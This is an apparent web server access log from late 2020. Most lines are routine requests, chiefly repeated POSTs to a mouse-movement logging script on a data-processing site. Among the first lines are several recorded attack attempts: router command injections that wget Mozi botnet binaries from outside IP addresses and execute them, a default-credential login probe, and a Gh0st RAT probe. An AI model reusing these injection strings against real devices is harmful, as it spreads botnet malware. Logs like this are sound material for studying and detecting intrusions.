- - [29/Nov/2020:09:19:55 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [29/Nov/2020:09:19:56 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
- - [29/Nov/2020:10:51:55 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:11:33:28 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.46.161.232:40999/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1835 "-" - "-"
- - [29/Nov/2020:15:36:21 +0000] "Gh0st\xad" 400 0 "-" - "-"
- - [29/Nov/2020:17:19:21 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.116.50.118:43976/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [29/Nov/2020:17:42:26 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
- - [29/Nov/2020:22:27:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:52 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:27:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:00 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:01 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:02 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:03 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:04 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:05 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:06 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:07 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:08 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:09 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:10 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:11 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:12 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:13 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:14 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:15 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:16 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:17 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:18 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:19 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:20 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:21 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:22 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 419 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:23 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 384 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:24 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:25 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:26 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:27 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:28 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:29 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:30 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:34 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:34 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/content/big_data/data_processing.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:35 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:36 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:37 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:38 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:38 +0000] "GET /content/big_data/data_analysis.php HTTP/1.1" 200 4249 "http://160.40.52.164/content/big_data.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:39 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:40 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:41 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:42 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:43 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:44 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:45 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:46 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:47 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:48 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:49 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:50 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:51 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:52 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:53 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:54 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:55 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:56 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:57 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:58 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
- - [29/Nov/2020:22:28:59 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/content/big_data/data_analysis.php" 6i6kr6b4j4e7mkn12n3q2vq4ih "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
